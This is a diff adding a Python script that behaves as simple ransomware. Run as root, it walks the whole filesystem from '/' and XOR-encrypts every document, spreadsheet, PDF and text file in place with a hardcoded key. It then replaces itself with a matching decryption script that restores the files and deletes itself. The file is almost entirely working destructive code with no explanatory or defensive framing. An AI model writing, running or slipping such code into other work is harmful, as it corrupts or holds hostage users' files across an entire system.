@@ -1,0 +1,98 @@
+import os
+import shutil
+import sys
+
+# Define the encryption key
+ENCRYPTION_KEY = "YourEncryptionKey"
+
+# Define the directory to encrypt
+DIRECTORY = "/"
+
+# Define the extension of files to encrypt
+FILE_EXTENSIONS = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf"]
+
+# Function to encrypt a file
+def encrypt_file(file_path):
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+    encrypted_data = bytearray(len(file_data))
+    for i, byte in enumerate(file_data):
+        encrypted_data[i] = byte ^ ord(ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)])
+    with open(file_path, "wb") as file:
+        file.write(encrypted_data)
+
+# Function to encrypt all files in a directory
+def encrypt_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if os.path.splitext(file_path)[1] in FILE_EXTENSIONS:
+                encrypt_file(file_path)
+
+# Check if the script is being run as root
+if os.geteuid() != 0:
+    print("This script must be run as root.")
+    sys.exit(1)
+
+# Encrypt the directory
+encrypt_directory(DIRECTORY)
+
+# Encrypt the script itself
+encrypt_file(__file__)
+
+# Replace the script with a decryption script
+decrypt_script = """
+#!/usr/bin/python
+
+import os
+import shutil
+import sys
+
+# Define the encryption key
+DECRYPTION_KEY = "YourEncryptionKey"
+
+# Define the directory to decrypt
+DIRECTORY = "/"
+
+# Define the extension of files to decrypt
+FILE_EXTENSIONS = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf"]
+
+# Function to decrypt a file
+def decrypt_file(file_path):
+    with open(file_path, "rb") as file:
+        encrypted_data = file.read()
+    decrypted_data = bytearray(len(encrypted_data))
+    for i, byte in enumerate(encrypted_data):
+        decrypted_data[i] = byte ^ ord(DECRYPTION_KEY[i % len(DECRYPTION_KEY)])
+    with open(file_path, "wb") as file:
+        file.write(decrypted_data)
+
+# Function to decrypt all files in a directory
+def decrypt_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if os.path.splitext(file_path)[1] in FILE_EXTENSIONS:
+                decrypt_file(file_path)
+
+# Check if the script is being run as root
+if os.geteuid() != 0:
+    print("This script must be run as root.")
+    sys.exit(1)
+
+# Decrypt the directory
+decrypt_directory(DIRECTORY)
+
+# Remove the decryption script
+os.remove(__file__)
+"""
+
+# Write the decryption script to the current file
+with open(__file__, "w") as file:
+    file.write(decrypt_script)
+
+# Make the current file executable
+os.chmod(__file__, 0o755)
+
+# Exit the script
+sys.exit(0)
